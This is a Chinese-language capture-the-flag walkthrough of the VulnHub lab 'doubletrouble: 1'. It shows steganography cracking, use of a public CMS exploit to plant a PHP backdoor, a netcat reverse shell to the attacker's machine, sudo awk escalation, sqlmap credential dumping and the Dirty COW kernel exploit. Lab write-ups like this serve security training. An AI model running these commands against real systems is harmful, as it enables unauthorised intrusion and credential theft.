---
title: "doubletrouble: 1"
date: 2026-05-12
draft: false
weight: 1
---

# 一、侦测
## 1.1 端口扫描
![](images/1.png)

## 1.2 HTTP扫描

![](images/2.png)

访问`secret`，发现图片`doubletrouble.jpg`，下载到本地

![](images/5.png)

## 1.3 exp搜索
![](images/3.png)

```zsh
cd ~/sec/vulnhub/doubletrouble_1
searchsploit -m 50944
python3 50944.py --help
```

![](images/4.png)

根据`--help`，使用这个exp需要(非顶级管理员的)邮箱和密码

## 1.4 图片隐写术
```zsh
stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt
```

结果如图![](images/6.png)

> 邮箱：otisrush@localhost.com
> 密码：otis666

# 二、攻击
## 2.1 exp利用

```ZSH
python3 50944.py -url http://192.168.203.138/ -u otisrush@localhost.com -p otis666
```

![](images/7.png)
![](images/8.png)
![](images/10.png)

## 2.2 网站侦测
![](images/9.png)

## 2.3 反弹shell（利用backdoor.php）
```zsh
# kali
nc -lvvp 7777

# 靶机
http://192.168.203.138/uploads/users/892030-backdoor.php?cmd=nc%20192.168.203.129%207777%20-e%20/bin/bash
```

```zsh
# 升级 shell界面

python3 -c 'import pty; pty.spawn("/bin/bash")'

Ctrl + Z

stty raw -echo; fg

export TERM=xterm

reset
```

## 2.4 提权

![](images/11.png)

root身份可以运行`/usr/bin/awk`，而`awk`具备执行系统命令的能力，可以用来开启具有root权限的shell

```ZSH
sudo awk 'BEGIN {system("/bin/sh")}'

python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](images/12.png)

> 找到第二个靶机镜像

# 三、靶机二
## 3.1 靶机二部署
```ZSH
# 靶机一中开启临时服务器
python3 -m http.server 8080

# kali 新终端下载镜像
wget http://192.168.203.138:8080/doubletrouble.ova
```

## 3.2 侦测
nmap检查到22和80端口，访问80端口，获得如图信息
![](images/14.png)

>目录扫描没获得信息

使用SQLmap工具，[跳转到 SQLmap 教程](/docs/cybersecurity/kali_linux基操/#sqlmap-basic)

```ZSH
sqlmap -u "http://192.168.203.139" --forms --dbs --batch

sqlmap -u "http://192.168.203.139" --forms -D doubletrouble --tables --batch

sqlmap -u "http://192.168.203.139" --forms -D doubletrouble -T users --columns --batch

sqlmap -u "http://192.168.203.139" --forms -D doubletrouble -T users -C "username,password" --dump --batch
```


| 第一步 | 第二步 | 第三步 | 第四步 |
| :---: | :---: | :---: | :---: |
| ![](images/15.png) | ![](images/16.png) | ![](images/17.png) | ![](images/18.png) |

>获得信息如下：
>Database：doubletrouble
>Table：users
>username：montreux, clapton
>password：GfsZxc1, ZubZub99

## 3.3 登录
在80端口的页面登录，失败
用ssh连接，`ssh clapton@192.168.203.139`使用 `clapton`+`ZubZub99` 登录成功

## 3.4 提权
`uname -a`：
Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux

![](images/19.png)
选择Dirty COW`40839.c`

`searchsploit -m 40839`

接着让**靶机**获取**kali**中的脚本
`kali创建一个http服务器`：`python -m http.server 80`
`靶机使用wget`：`wget http://192.168.203.129/40839.c`

接着根据作者提示：
![](images/20.png)
```BASH
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
su firefart
```

## 3.5 FLAG
>flag1：`clapton`用户目录的`user.txt`
>flag2：`root`用户目录的`root.txt`